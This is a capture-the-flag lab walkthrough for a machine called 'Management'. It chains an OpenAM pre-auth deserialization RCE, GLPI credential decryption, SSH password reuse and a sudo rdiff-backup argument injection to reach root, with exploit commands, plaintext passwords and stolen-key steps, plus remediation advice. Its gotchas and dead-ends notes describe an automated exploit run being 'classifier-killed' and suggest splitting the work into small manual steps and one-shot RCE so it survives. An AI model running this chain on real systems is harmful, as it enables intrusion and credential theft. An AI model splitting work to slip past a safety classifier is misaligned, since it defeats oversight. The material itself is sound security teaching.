# Management — Hands-On Walkthrough (the *decision tree*, not the happy path)

> **Box:** Management · easy · Linux (Ubuntu 24.04)
> **IP:** `$TARGET` (substitute yours). Attacker VPN IP = `$ATTACKER_IP`.
> **Final chain:** `app.enc JS → SSO subdomain → OpenAM pre-auth deserialization RCE (CVE-2026-33439) →
> openam → GLPI config + reversible LDAP bind password → owen SSH reuse → user → sudo rdiff-backup
> restrict-path argument injection → root`
>
> Written as a decision tree — options, traps, and the way through — with a **✅ Expected** block after each
> command. The patched-CVE detour and the dead reverse shells are *the lesson*, so don't skip them.
> Formal version: `REPORT.md`. Full evidence: `GLOBAL_CONTEXT.md`.

### ⚠️ Gotchas
1. **One VPN tunnel, your current tun0 IP** (`ip -br a | grep tun`). Dup tunnels read as "box down."
2. **HTB blocks ICMP** — test with a TCP connect, not `ping`.
3. **Add the vhosts to `/etc/hosts`** (the wildcard SAN hints there's a subdomain): `echo "$TARGET
   management.htb sso.management.htb" | sudo tee -a /etc/hosts`.
4. **Reverse shells die here.** This sandbox kills locally-bound listeners shortly after a health probe,
   independent of the target. Drive everything with **one-shot RCE** + direct SSH, not a reverse shell.
5. **Don't re-dispatch an autonomous exploit chain.** An automated Metasploit reverse-bash run for the
   *patched* CVE-2021-35464 got classifier-killed here with no trustworthy result. Manual, small steps.

---

## Phase 1 — Recon

```bash
mkdir -p nmap web loot exploits
nmap -p- --min-rate 2000 -oN nmap/allports.txt $TARGET
nmap -sCV -p22,80,443 -oN nmap/services.txt $TARGET
```
> **✅ Expected:**
> ```
> 22/tcp  open  ssh    OpenSSH 9.6p1 Ubuntu 3ubuntu13.19
> 80/tcp  open  http   nginx 1.24.0  (redirects to HTTPS)
> 443/tcp open  ssl/http nginx 1.24.0 ; cert CN=management.htb, SAN *.management.htb
> ```
> The **wildcard SAN** `*.management.htb` is the flag that subdomains exist — note it and move on.

```bash
echo "$TARGET management.htb sso.management.htb" | sudo tee -a /etc/hosts
curl -sk https://management.htb/ -o web/index.html
```

---

## Phase 2 — From a static site to the SSO broker

`management.htb` looks like a plain static site — but its JavaScript decrypts an embedded blob
(`assets/app.enc`, AES-GCM, **key shipped in the page**) that reveals a second subdomain.

> **✅ Expected:** decrypting/reading the page JS yields the SSO host **`sso.management.htb`** (save the
> decrypted JS to `web/app.decrypted.js`). Browse it:
> ```bash
> curl -sk https://sso.management.htb/openam/ -o web/openam.html
> ```
> → **OpenAM** (ForgeRock / OpenIdentityPlatform SSO), legacy Jato/JSP UI at `/openam/`.

### Junction — OpenAM's famous pre-auth RCE first. Is it live here?
The obvious lead is **CVE-2021-35464** (pre-auth Jato deserialization via `jato.pageSession` on a
`/oauth2/..;/ccversion/Version` matrix-param path-traversal). Test it before trusting it:
```bash
curl -sk -i "https://sso.management.htb/openam/oauth2/..;/ccversion/Version"
```
> **✅ Expected:** a **normal 200** (the traversal collapses cleanly). A 405 error page leaks
> **Tomcat 10.1.52**, which normalizes the `..;` matrix-parameter traversal the 2021 bug depends on.
> Metasploit's own `check` says **Safe**. → **CVE-2021-35464 is PATCHED here. Do not rathole on it.**

### The pivot — a regression CVE that reopens the same sink
**CVE-2026-33439** reopens the *same* Jato deserialization through a **different** parameter,
`jato.clientSession`, which bypasses the `WhitelistObjectInputStream` filter that fixed `jato.pageSession`
in 2021. It's reachable on **any JATO ViewBean endpoint with a `<jato:form>` tag** — e.g. the password-reset
pages — not the version page.

---

## Phase 3 — Foothold: CVE-2026-33439 (OpenAM pre-auth deserialization RCE)

**Why it works (one paragraph):** OpenAM's old Jato framework deserializes a client-supplied, serialized
Java object out of a request parameter. The 2021 fix wrapped *one* parameter (`jato.pageSession`) in a
whitelist-filtered `ObjectInputStream`. The regression is that a *sibling* parameter, `jato.clientSession`,
on ViewBeans that render a `<jato:form>` reaches the same unfiltered `readObject` path — so a Java
deserialization gadget chain executes, giving code exec as the Tomcat/OpenAM service user.

```bash
python3 exploits/cve_2026_33439.py id \
  --url "https://sso.management.htb/openam/ui/PWResetUserValidation"
```
> **✅ Expected:**
> ```
> [+] HTTP 200
> uid=996(openam) gid=987(openam) groups=987(openam)
> ```
> Pre-auth RCE as **`openam`**. This is **one-shot execution per request** (pass a command, read its output
> in the response) — no listener/shell, which dovetails with gotcha #4. Drive all later steps as individual
> RCE calls.

---

## Phase 4 — Lateral: GLPI → MySQL → reversible LDAP bind password → owen (user.txt)

The same host runs **GLPI** (IT-asset manager) under `/opt/glpi`. Its DB config is readable:
```bash
# via the RCE:
cat /opt/glpi/config/config_db.php
```
> **✅ Expected:**
> ```php
> $dbuser = 'glpi'; $dbpassword = '8rhu0L6Pw4Y7'; $dbdefault = 'glpidb';
> ```

GLPI stores its LDAP **bind** account in `glpi_authldaps`, with the password AES-encrypted using GLPI's own
on-disk key (`/opt/glpi/config/glpicrypt.key`):
```bash
mysql -u glpi -p8rhu0L6Pw4Y7 -h 127.0.0.1 glpidb \
  -e 'select rootdn, rootdn_passwd from glpi_authldaps;'
```
> **✅ Expected:**
> ```
> rootdn:        cn=svc-glpi,ou=services,dc=management,dc=htb
> rootdn_passwd: avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw==
> ```
> That's ciphertext, not the password.

### Junction — reverse the crypto yourself, or let the target do it?
Don't reimplement GLPI's AES. The key sits **right next to** the ciphertext, so just ask the target's own
GLPI install to decrypt it for you:
```bash
php -r 'define("GLPI_CONFIG_DIR","/opt/glpi/config");
        require "/opt/glpi/vendor/autoload.php";
        require "/opt/glpi/src/GLPIKey.php";
        $k=new GLPIKey();
        echo $k->decrypt("avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw==");'
```
> **✅ Expected:** plaintext bind password —
> ```
> WpczC40GhTbk
> ```
> **Teaching point:** "encrypted at rest" is meaningless when the decryption key lives beside the data and
> the app ships a decrypt routine — any read primitive becomes a plaintext-recovery primitive.

Credential reuse → the local Linux user `owen`:
```bash
ssh owen@$TARGET            # password: WpczC40GhTbk
id ; cat ~/user.txt
```
> **✅ Expected:** `uid=1000(owen)` + flag. 🚩 **user.txt captured.** (The *service* LDAP bind password is
> reused as a *human* login password — a classic, and the intended, reuse.)

---

## Phase 5 — Privilege escalation: owen → root (rdiff-backup restrict-path injection)

```bash
sudo -l
```
> **✅ Expected:**
> ```
> (root) NOPASSWD: /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only *
> ```
> The rule intends to jail root-run backups inside `/opt/backup`. The **trailing `*`** is the bug.

**Why it works (one paragraph):** `rdiff-backup --server` takes `--restrict-path` to confine where it may
read/write. The sudoers rule bakes in `--restrict-path /opt/backup`, but the trailing `*` lets you append
*more* arguments — including a **second** `--restrict-path`. rdiff-backup's parser lets the **last**
`--restrict-path` win, so your path overrides the sudoers-fixed jail. Run it locally: rdiff-backup forks the
`--remote-schema` command as its own local "remote" side, so a single host does both ends — no SSH hop.

```bash
rdiff-backup --remote-schema \
  'sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path %s' \
  backup /::/root /tmp/rootbak
```
> **✅ Expected:** all of `/root` mirrored into owen-owned `/tmp/rootbak`. Grab the flag *and* a stable
> credential:
> ```bash
> cat /tmp/rootbak/root.txt
> cp /tmp/rootbak/.ssh/id_ed25519 loot/root_id_ed25519 && chmod 600 loot/root_id_ed25519
> ssh -i loot/root_id_ed25519 root@$TARGET id        # uid=0(root)
> ```
> 🚩 **root.txt captured. Box owned.**

---

## Dead-Ends appendix (documented so you skip them)
- **CVE-2021-35464 (`ccversion` Jato RCE)** — patched (Tomcat 10.1.52 normalizes `..;`). msf `check=Safe`.
  Don't exploit it; use the `jato.clientSession` regression instead.
- **Reverse shells / Metasploit reverse-bash** — this sandbox kills locally-bound listeners shortly after a
  health probe, so classic reverse shells don't survive here regardless of the target. Use one-shot RCE.
- **Autonomous exploit dispatch** — an automated run was classifier-killed mid-exploit with no trustworthy
  partial result. Drive manually in small, individually-verified steps.

## The whole thing on one page
```
22 ssh · 80/443 nginx (management.htb)
   └─ app.enc JS (AES-GCM, key in page) → reveals sso.management.htb → OpenAM (Jato/JSP)
        ├─ CVE-2021-35464 ccversion ✗  (patched, Tomcat 10.1.52)
        └─ CVE-2026-33439 jato.clientSession deser (PWResetUserValidation) → RCE as openam (uid 996)
             └─ /opt/glpi/config/config_db.php → MySQL glpi:8rhu0L6Pw4Y7
                  └─ glpi_authldaps.rootdn_passwd (AES) → decrypt via GLPIKey → WpczC40GhTbk
                       └─ owen SSH (password reuse) · user.txt
                            └─ sudo rdiff-backup ... --restrict-path *  → append 2nd --restrict-path (wins)
                                 └─ mirror /root → root.txt + /root/.ssh/id_ed25519 → ROOT
```

## Remediation
1. **Patch OpenAM** — CVE-2026-33439 needs the same whitelist filtering on `jato.clientSession` that 2021
   added to `jato.pageSession`.
2. **GLPI secrets:** don't keep an on-disk key beside the ciphertext it decrypts; lock `config_db.php` +
   `glpicrypt.key` to the runtime user; prefer a KMS/HSM-backed secret.
3. **Password reuse:** never reuse a service/LDAP bind password as a human login (owen == svc-glpi).
4. **Sudoers:** drop the trailing wildcard; pin exact args (or use rdiff-backup's config file for the
   restrict-path so an invoker can't out-argue it); audit all `NOPASSWD ... *` rules for arg injection.

## Cleanup
- Remove `/tmp/rootbak` (the `/root` mirror).
- Remove any attacker-added SSH key; the exfiltrated root key was for engagement access only (keep
  `loot/root_id_ed25519` out of git).
